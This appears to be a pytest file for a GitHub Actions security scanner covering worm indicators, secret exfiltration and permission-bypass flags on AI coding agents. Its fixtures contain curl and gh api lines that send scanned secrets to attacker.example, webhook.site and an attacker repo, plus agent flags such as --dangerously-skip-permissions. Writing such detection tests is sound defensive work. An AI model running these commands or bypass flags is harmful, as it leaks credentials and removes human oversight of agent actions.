"""Per-rule tests for the GHA-05x supply-chain-worm IOC pack:
GHA-056 (known worm IOC strings — Shai-Hulud / s1ngularity),
GHA-057 (secret scanner output piped to network egress),
GHA-058 (agentic CLI invoked with permission-bypass flags).
"""
from __future__ import annotations

from .conftest import run_check

# ── GHA-056 known worm IOC strings ───────────────────────────────────


class TestGHA056WormIndicators:
    def test_fails_on_shai_hulud_workflow_filename(self):
        wf = """
        name: ci
        on: push
        jobs:
          build:
            runs-on: ubuntu-latest
            permissions: { contents: write }
            steps:
              - run: |
                  cat > .github/workflows/shai-hulud-workflow.yml <<'EOF'
                  name: x
                  on: push
                  jobs: { y: { runs-on: ubuntu-latest, steps: [{run: 'echo'}] } }
                  EOF
        """
        f = run_check(wf, "GHA-056")
        assert not f.passed
        assert "shai-hulud" in f.description.lower() or "worm" in f.description.lower()

    def test_fails_on_known_webhook_uuid(self):
        wf = """
        name: ci
        on: push
        jobs:
          build:
            runs-on: ubuntu-latest
            steps:
              - run: curl https://webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7 -d @creds
        """
        f = run_check(wf, "GHA-056")
        assert not f.passed

    def test_fails_on_s1ngularity_repo_name(self):
        wf = """
        name: ci
        on: push
        jobs:
          build:
            runs-on: ubuntu-latest
            steps:
              - run: gh repo create "$USER/s1ngularity-repository-42" --public
        """
        f = run_check(wf, "GHA-056")
        assert not f.passed

    def test_passes_on_clean_workflow(self):
        wf = """
        name: ci
        on: push
        jobs:
          build:
            runs-on: ubuntu-latest
            steps:
              - run: npm test
        """
        f = run_check(wf, "GHA-056")
        assert f.passed


# ── GHA-057 secret scanner exfil ─────────────────────────────────────


class TestGHA057SecretScannerExfil:
    def test_fails_on_trufflehog_piped_to_curl(self):
        wf = """
        name: ci
        on: push
        jobs:
          harvest:
            runs-on: ubuntu-latest
            steps:
              - run: trufflehog filesystem . --json | curl -X POST --data-binary @- https://attacker.example/
        """
        f = run_check(wf, "GHA-057")
        assert not f.passed

    def test_fails_on_gitleaks_piped_to_gh_api_post(self):
        wf = """
        name: ci
        on: push
        jobs:
          harvest:
            runs-on: ubuntu-latest
            steps:
              - run: gitleaks detect --report-format json --report-path /dev/stdout | gh api -X POST /repos/attacker/loot/issues -f title=hi
        """
        f = run_check(wf, "GHA-057")
        assert not f.passed

    def test_fails_on_trufflehog_under_pull_request_target(self):
        wf = """
        name: ci
        on:
          pull_request_target:
            types: [opened]
        jobs:
          scan:
            runs-on: ubuntu-latest
            steps:
              - run: trufflehog filesystem . --json
        """
        f = run_check(wf, "GHA-057")
        assert not f.passed

    def test_passes_on_scanner_writing_to_workspace_only(self):
        wf = """
        name: ci
        on: push
        jobs:
          scan:
            runs-on: ubuntu-latest
            steps:
              - run: trufflehog filesystem . --json > findings.sarif
        """
        f = run_check(wf, "GHA-057")
        assert f.passed

    def test_passes_on_clean_workflow(self):
        wf = """
        name: ci
        on: push
        jobs:
          build:
            runs-on: ubuntu-latest
            steps:
              - run: npm test
        """
        f = run_check(wf, "GHA-057")
        assert f.passed

    def test_fails_on_pipeline_split_by_backslash_continuation(self):
        # The exact exploit-example shape: trufflehog and curl on
        # separate YAML lines joined by a trailing ``\``. The detector
        # must fold the continuation before splitting on ``|``.
        wf = """
        name: ci
        on: push
        jobs:
          harvest:
            runs-on: ubuntu-latest
            steps:
              - run: |
                  trufflehog filesystem . --json \\
                    | curl -X POST --data-binary @- \\
                        https://webhook.site/abc
        """
        f = run_check(wf, "GHA-057")
        assert not f.passed
        assert "piped to network egress" in f.description.lower()

    def test_passes_when_step_if_restricts_to_push(self):
        # Workflow declares pull_request_target alongside push, but the
        # scanner step is gated on github.event_name == 'push', so the
        # untrusted path is unreachable.
        wf = """
        name: ci
        on: [push, pull_request_target]
        jobs:
          scan:
            runs-on: ubuntu-latest
            steps:
              - if: github.event_name == 'push'
                run: trufflehog filesystem . --json > findings.sarif
        """
        f = run_check(wf, "GHA-057")
        assert f.passed

    def test_passes_when_job_if_restricts_to_push(self):
        wf = """
        name: ci
        on: [push, pull_request_target]
        jobs:
          scan:
            if: ${{ github.event_name == 'push' }}
            runs-on: ubuntu-latest
            steps:
              - run: trufflehog filesystem . --json > findings.sarif
        """
        f = run_check(wf, "GHA-057")
        assert f.passed

    def test_fails_when_if_predicate_mentions_untrusted_trigger(self):
        # A predicate that *includes* an untrusted trigger doesn't restrict.
        wf = """
        name: ci
        on: [push, pull_request_target]
        jobs:
          scan:
            runs-on: ubuntu-latest
            steps:
              - if: ${{ github.event_name == 'push' || github.event_name == 'pull_request_target' }}
                run: trufflehog filesystem . --json
        """
        f = run_check(wf, "GHA-057")
        assert not f.passed


# ── GHA-058 agentic CLI permission-bypass flags ──────────────────────


class TestGHA058AICLIUnsafeFlags:
    def test_fails_on_claude_dangerously_skip_permissions(self):
        wf = """
        name: ci
        on: push
        jobs:
          agentic:
            runs-on: ubuntu-latest
            steps:
              - run: |
                  npm i -g @anthropic-ai/claude-code
                  claude --dangerously-skip-permissions -p "walk fs"
        """
        f = run_check(wf, "GHA-058")
        assert not f.passed
        assert "claude" in f.description.lower() or "bypass" in f.description.lower()

    def test_fails_on_gemini_yolo(self):
        wf = """
        name: ci
        on: push
        jobs:
          agentic:
            runs-on: ubuntu-latest
            steps:
              - run: gemini --yolo -p "do the thing"
        """
        f = run_check(wf, "GHA-058")
        assert not f.passed

    def test_fails_on_q_trust_all_tools(self):
        wf = """
        name: ci
        on: push
        jobs:
          agentic:
            runs-on: ubuntu-latest
            steps:
              - run: q chat --trust-all-tools "explain"
        """
        f = run_check(wf, "GHA-058")
        assert not f.passed

    def test_fails_on_cursor_agent_invocation(self):
        wf = """
        name: ci
        on: push
        jobs:
          agentic:
            runs-on: ubuntu-latest
            steps:
              - run: cursor-agent --task "audit the repo"
        """
        f = run_check(wf, "GHA-058")
        assert not f.passed

    def test_fails_on_allowedtools_wildcard(self):
        wf = """
        name: ci
        on: push
        jobs:
          agentic:
            runs-on: ubuntu-latest
            steps:
              - run: claude --allowedTools "*" -p "anything goes"
        """
        f = run_check(wf, "GHA-058")
        assert not f.passed

    def test_passes_on_scoped_allowedtools(self):
        wf = """
        name: ci
        on: push
        jobs:
          agentic:
            runs-on: ubuntu-latest
            steps:
              - run: claude --allowedTools "Read,Grep" -p "summarize"
        """
        f = run_check(wf, "GHA-058")
        assert f.passed

    def test_passes_on_tool_name_containing_substring_all(self):
        # Regression: the old regex matched the literal substring "all"
        # anywhere in the value, so CallTool / rally / "Read,Grep,All"
        # tripped a false positive. The anchored alternation must reject
        # these.
        wf = """
        name: ci
        on: push
        jobs:
          agentic:
            runs-on: ubuntu-latest
            steps:
              - run: |
                  claude --allowedTools CallTool -p "x"
                  claude --allowedTools rally -p "y"
                  claude --allowedTools "Read,Grep,All" -p "z"
        """
        f = run_check(wf, "GHA-058")
        assert f.passed

    def test_passes_on_clean_workflow(self):
        wf = """
        name: ci
        on: push
        jobs:
          build:
            runs-on: ubuntu-latest
            steps:
              - run: npm test
        """
        f = run_check(wf, "GHA-058")
        assert f.passed
